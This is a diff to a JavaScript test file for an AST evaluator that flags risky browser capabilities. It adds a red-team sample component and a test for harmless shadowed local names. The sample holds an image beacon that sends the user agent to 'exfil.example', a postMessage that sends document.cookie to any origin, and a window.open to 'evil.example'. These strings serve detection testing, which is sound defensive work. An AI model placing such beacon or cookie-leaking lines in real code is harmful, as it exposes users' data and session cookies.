@@ -34,6 +34,35 @@ test('AST evaluator detects member access browser capabilities', () => {
   assert.ok(ruleIds.includes('browser.clipboard'));
 });
 
+test('AST evaluator detects red-team browser exfiltration and DOM escape vectors', () => {
+  const source = `
+    export default function Component() {
+      const img = new Image();
+      img.src = 'https://exfil.example/pixel?ua=' + navigator.userAgent + '&w=' + window.innerWidth;
+      const worker = new Worker('/worker.js');
+      const shared = new SharedWorker('/shared-worker.js');
+      window.open('https://evil.example', '_blank');
+      parent.postMessage({ cookie: document.cookie }, '*');
+      localStorage.getItem('promptframe');
+      document.createElement('script');
+      document.createElement('iframe');
+      document.body.innerHTML = '<strong>unsafe</strong>';
+      return <iframe title="escape" />;
+    }
+  `;
+  const ruleIds = ruleIdsFor(source);
+
+  assert.ok(ruleIds.includes('browser.image_beacon'));
+  assert.ok(ruleIds.includes('browser.fingerprint'));
+  assert.ok(ruleIds.includes('browser.worker_context'));
+  assert.ok(ruleIds.includes('browser.window_open'));
+  assert.ok(ruleIds.includes('browser.cross_context_message'));
+  assert.ok(ruleIds.includes('storage.browser_storage'));
+  assert.ok(ruleIds.includes('browser.dynamic_script'));
+  assert.ok(ruleIds.includes('browser.iframe_escape'));
+  assert.ok(ruleIds.includes('dom.dangerous_html'));
+});
+
 test('AST evaluator detects dynamic import and string timers', () => {
   const source = `
     import(userSuppliedModule);
@@ -52,7 +81,21 @@ test('AST evaluator avoids comments, strings and harmless local symbols', () => 
     const text = "navigator.serviceWorker.register('/not-real')";
     const BroadcastChannel = 'label only';
     const serviceWorker = { register: () => 'local' };
+    const Image = class LocalImage {};
+    const Worker = class LocalWorker {};
+    const SharedWorker = class LocalSharedWorker {};
+    const navigator = { userAgent: 'local', language: 'local' };
+    const window = { open: () => undefined, innerWidth: 0 };
+    const parent = { postMessage: () => undefined };
+    const localStorage = { getItem: () => undefined };
     serviceWorker.register();
+    new Image();
+    new Worker();
+    new SharedWorker();
+    navigator.userAgent;
+    window.open();
+    parent.postMessage();
+    localStorage.getItem('x');
   `;
 
   assert.deepEqual(ruleIdsFor(source), []);
